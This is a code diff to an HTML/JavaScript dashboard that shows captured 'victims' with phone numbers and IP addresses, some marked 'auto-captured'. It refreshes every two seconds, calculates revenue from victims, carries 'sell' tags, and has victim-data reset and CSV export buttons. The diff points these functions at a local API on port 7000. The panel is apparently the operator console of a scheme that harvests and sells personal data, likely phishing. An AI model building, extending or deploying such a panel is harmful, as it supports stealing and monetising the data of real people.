@@ -64,7 +64,6 @@ canvas#matrix { position:fixed; top:0; left:0; z-index:0; opacity:0.06; pointer-
 .vfield-value.money { color:#ffd93d; text-shadow:0 0 8px #ffd93d44; }
 .sell-tag { display:inline-block; background:#00c85322; border:1px solid #00c85444; color:#00c853; font-size:9px; padding:3px 8px; border-radius:3px; margin-top:6px; letter-spacing:1px; }
 
-/* ELITE EYE */
 .empty-state { text-align:center; padding:60px; }
 .eye-container { width:120px; height:120px; margin:0 auto 24px; position:relative; }
 .eye-outer { width:120px; height:60px; background:#1a0a0a; border:2px solid #ff2d2d44; border-radius:60px 60px 60px 60px; position:absolute; top:50%; transform:translateY(-50%); overflow:hidden; display:flex; align-items:center; justify-content:center; box-shadow:0 0 30px #ff2d2d22; }
@@ -104,6 +103,7 @@ canvas#matrix { position:fixed; top:0; left:0; z-index:0; opacity:0.06; pointer-
   <div class="topbar-right">
     <div class="live-indicator"><div class="live-dot"></div>LIVE — AUTO REFRESH 2s</div>
     <button class="clear-btn" onclick="resetData()">[ CLEAR ALL ]</button>
+    <button class="clear-btn" onclick="window.open('http://localhost:7000/download')">[ EXPORT CSV ]</button>
   </div>
 </div>
 
@@ -173,7 +173,8 @@ canvas#matrix { position:fixed; top:0; left:0; z-index:0; opacity:0.06; pointer-
 </div>
 
 <script>
-// Matrix rain
+const API = "http://localhost:7000";
+
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
@@ -199,7 +200,6 @@ function showFlash(v) {
   const f = document.getElementById('flash');
   document.getElementById('flash-body').textContent = v.phone && v.phone !== 'auto-captured' ? '📱 ' + v.phone : '🌐 ' + v.ip;
   f.style.display = 'block';
-  // Flash stat box
   const st = document.getElementById('stat-total');
   st.classList.add('flash-stat');
   setTimeout(() => st.classList.remove('flash-stat'), 1000);
@@ -218,7 +218,7 @@ function calcRevenue(victims) {
 
 async function resetData() {
   if (confirm('Clear all victim data?')) {
-    await fetch('/reset', { method: 'DELETE' });
+    await fetch(`${API}/reset`, { method: 'DELETE' });
     prevCount = 0;
     fetchData();
   }
@@ -226,7 +226,7 @@ async function resetData() {
 
 async function fetchData() {
   try {
-    const res = await fetch('/data');
+    const res = await fetch(`${API}/data`);
     const data = await res.json();
     const victims = data.victims || [];
     const count = victims.length;
